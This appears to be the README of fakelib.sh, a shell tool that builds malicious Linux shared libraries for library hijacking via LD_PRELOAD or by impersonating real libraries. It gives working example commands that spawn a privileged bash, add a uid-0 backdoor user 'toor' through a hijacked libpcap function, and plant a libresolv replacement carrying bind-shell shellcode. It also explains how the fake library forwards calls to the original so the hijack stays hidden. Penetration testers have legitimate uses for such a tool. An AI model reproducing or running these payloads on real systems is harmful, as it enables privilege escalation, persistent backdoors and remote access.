# Fakelib.sh

Fakelib.sh is a simple tool for generating Linux shared libraries to use in library hijacking scenarios. It can be used to create empty libraries with some payload and run them with LD_PRELOAD. It can be also used to create a malicious library that emulates an existing library, exporting all its original symbols and trying to call the original functions to maintain the original library functionality.

## Usage

```
Usage: fakelib.sh [-o <output_lib>] [-l <original_lib>] [-t <target_lib>]
                  [-a <arch>] [-m <method>] [-f <function>] [-p <payload>]
                  [-c <command>] [-s <shellcode>] [-f] [-g] [-v] [-h]
```

**Options**:
* **-o \<output_lib\>**: output with fake library
* **-l \<original_lib\>**: original library to emulate
* **-t \<target_lib\>**: original library path to load with dlopen (use if it's not the same as the -l parameter value)
* **-a \<architecture\>**: "32" or "64"
* **-m \<method\>**: payload execution method. Available methods:
  * **constructor**: run payload in constructor method (default)
  * **destructor**: run payload in destructor method (WARNING, payload may not be executed)
  * **custom**: run payload in custom function (use -f flag) (WARNING, may break functionality in 32 bits)
* **-f \<function\>**: function to inject payload (with method "custom")
* **-p \<payload\>**: payload that the library will run. Available payloads:
  * **echo**: print test message (default)
  * **bash**: run bash setting uid/gid to euid/egid
  * **system**: run custom command (use -c flag)
  * **custom**: run custom shellcode (use -s flag)
* **-c \<custom command\>**: command to run with payload "system"
* **-s \<shellcode\>**: shellcode to run with payload "custom". Must be inside quotes in C string format
* **-f**: fork and run payload in child process
* **-g**: generate links to original library to preserve functionality. (WARNING, doesn't always work)
* **-v**: verbose. Print fake library source code
* **-h**: print help

## Examples

You can try the following examples with the **-v** option to check what code is generated.

Create new 32-bit library "mylib.so" that runs a bash shell when loaded:
```
./fakelib.sh -o mylib.so -a 32 -p bash
```

Emulate library /usr/lib/libpcap.so.1 that creates new user with uid 0 when the "pcap_activate" function is called:
```
./fakelib.sh -l /usr/lib/libpcap.so.1 -m custom -g -f pcap_activate -p system -c "useradd -o -u 0 toor ; echo toor:toor|chpasswd"

```

Emulate library libresolv-2.12.so into /tmp/libresolv.so.2 with original library path under /lib64/libresolv.so.2, that forks and spawns a custom bind shell payload when loaded:
```
./fakelib.sh -l libresolv-2.12.so -o /tmp/libresolv.so.2 -t /lib64/libresolv.so.2 -g -k -p custom -s "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
```

![fakelib.sh demo](https://raw.githubusercontent.com/Eblazquez/fakelib.sh/master/fakelib.sh_demo.gif)

## How does it work?

Using an existing lib and specifying the **-g** option, fakelib.sh tries to load the original library functions. Usually to achieve this, it's necessary to define all these functions on the malicious library, obtain pointers to the original functions with dlsym, and then perform a call to these pointers.

However, the main problem is that the function definitions and calls must specify the expected number/type of arguments of the original library. The process of obtaining these arguments can be tedious, or sometimes they can't be easily obtained. It's possible to create a malicious library exporting all the original symbols with empty functions so it can be loaded and the payload is executed, but the original functionality of the library is lost.

Fakelib.sh exports the same functions as the original library using void* types with no arguments, but instead of calling the original function with a standard C function call, assembly instructions are used to preserve the stack frame. At the start of each function the instructions "push %rbp; mov %rsp,%rbp" are called, so to revert them a "pop %rbp" is performed (or %ebp in x86). Then the original function is called using a jmp instruction (instead of a call so the stack is not modified).

This method is not perfect, and doesn't work for some distributions/versions (like CentOS 6). However, it helps automate the process of generating a working malicious library since this way it's not necessary to know the original number or type of function arguments, and it seems to work with several system libraries.

Anyway, try always first the hijacked library on a controlled environment, if possible hijack the least used libraries, and do not try to hijack main libraries like libc.
